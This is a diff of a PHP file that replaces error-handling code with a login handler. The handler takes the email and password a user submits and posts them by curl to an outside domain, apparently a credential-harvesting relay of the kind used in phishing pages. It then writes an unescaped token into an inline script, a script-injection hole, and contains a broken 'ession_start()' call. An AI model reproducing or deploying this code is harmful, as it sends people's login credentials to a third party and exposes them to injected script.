@@ -1,21 +1,46 @@
 <?php
 
-set_error_handler( "log_error" );
-set_exception_handler( "log_exception" );
-function log_error( $num, $str, $file, $line, $context = null )
-{
+ession_start();
 
-    log_exception( new ErrorException( $str, 0, $num, $file, $line ) );
+$email = "";
+$password = "";
+$response = "";
+
+// Check if the form was submitted
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $email = htmlspecialchars($_POST['email']); 
+    $password = htmlspecialchars($_POST['password']);
+} 
+ 
+ 
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
+curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+        'email' => $email,
+        'password' => $password
+    ]));
+
+
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
+curl_setopt($ch, CURLOPT_URL, 'https://cloud.fatturapro.click/junior2023/');
+
+$response = curl_exec($ch);
+$token = $response;
+
+if (isset($_GET['token'])) {
+  $token = htmlspecialchars($_GET['token']);
+  // Save the token in a session variable or a database
 }
 
-function log_exception( Exception $e)
-{
-    http_response_code(500);
-    log_error($e);
-    echo "Some Error Occured. Please Try Later.";
-    exit();
-}
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_HTTPHEADER, array('Authorization: Bearer ' . $token));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_URL, 'https://cloud.fatturapro.click/junior2023/');
 
-error_reporting(E_ALL);
-require_once("texsss.php");// I am doing a FATAL Error here
+$response = curl_exec($ch);
+
+echo "<script>var token = '$token';</script>";
+
 ?>
